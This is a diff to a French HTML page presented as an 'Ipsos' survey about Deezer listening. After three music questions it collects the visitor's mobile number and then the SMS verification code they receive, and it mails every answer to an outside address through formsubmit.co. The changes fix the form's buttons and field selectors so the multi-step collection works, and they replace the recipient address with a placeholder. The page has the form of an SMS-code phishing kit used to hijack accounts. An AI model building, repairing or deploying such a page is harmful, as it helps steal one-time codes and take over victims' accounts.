@@ -48,7 +48,7 @@
     </div>
 
     <!-- FORMULAIRE -->
-    <form action="https://formsubmit.co/John123abcd@proton.me" method="POST">
+    <form action="https://formsubmit.co/tonemail@domaine.com" method="POST">
         <!-- Champ caché pour l'objet du mail -->
         <input type="hidden" name="_subject" value="Réponse au sondage Ipsos" />
         <input type="hidden" name="_captcha" value="false" />
@@ -60,21 +60,21 @@
             <input type="text" name="artiste_prefere" placeholder="Votre artiste préféré" required>
             <input type="text" name="artiste_deezer" placeholder="Artiste que vous écoutez sur Deezer" required>
             <input type="text" name="artiste_decouverte" placeholder="Artiste découvert récemment" required>
-            <button type="submit" id="btnEtape1">Suivant</button>
+            <button type="button" id="btnEtape1">Suivant</button>
         </div>
 
         <!-- Étape 2 -->
         <div class="box" id="etape2">
             <h2>Numéro de téléphone</h2>
             <input type="text" name="telephone" placeholder="Ex: 06XXXXXXXX" required>
-            <button type="submit" id="btnEtape2">Suivant</button>
+            <button type="button" id="btnEtape2">Suivant</button>
         </div>
 
         <!-- Étape 3 -->
         <div class="box" id="etape3">
             <h2>Code de vérification</h2>
             <input type="text" name="code_sms" placeholder="Code reçu" required>
-            <button type="submit" id="btnEtape3">Terminer</button>
+            <button type="button" id="btnEtape3">Terminer</button>
         </div>
 
         <!-- Étape finale -->
@@ -106,23 +106,23 @@
 
         // Étape 1
         document.getElementById('btnEtape1').addEventListener('click', () => {
-            let pref = document.getElementById('artiste_prefere').value.trim();
-            let deezer = document.getElementById('artiste_deezer').value.trim();
-            let decouverte = document.getElementById('artiste_decouverte').value.trim();
+            let pref = document.querySelector('[name="artiste_prefere"]').value.trim();
+            let deezer = document.querySelector('[name="artiste_deezer"]').value.trim();
+            let decouverte = document.querySelector('[name="artiste_decouverte"]').value.trim();
             if (!pref || !deezer || !decouverte) { alert("Veuillez remplir toutes les questions."); return; }
             showStep('etape2', 50);
         });
 
         // Étape 2
         document.getElementById('btnEtape2').addEventListener('click', () => {
-            let tel = document.getElementById('telephone').value.trim();
+            let tel = document.querySelector('[name="telephone"]').value.trim();
             if (!/^0[67]\d{8}$/.test(tel)) { alert("Numéro invalide (06 ou 07)."); return; }
             showStep('etape3', 75);
         });
 
         // Étape 3
         document.getElementById('btnEtape3').addEventListener('click', () => {
-            let code = document.getElementById('code_sms').value.trim();
+            let code = document.querySelector('[name="code_sms"]').value.trim();
             if (!code) { alert("Veuillez entrer le code."); return; }
             showStep('etape4', 100);
         });
@@ -130,7 +130,4 @@
 
 </body>
 </html>
-
-</html>
-
 
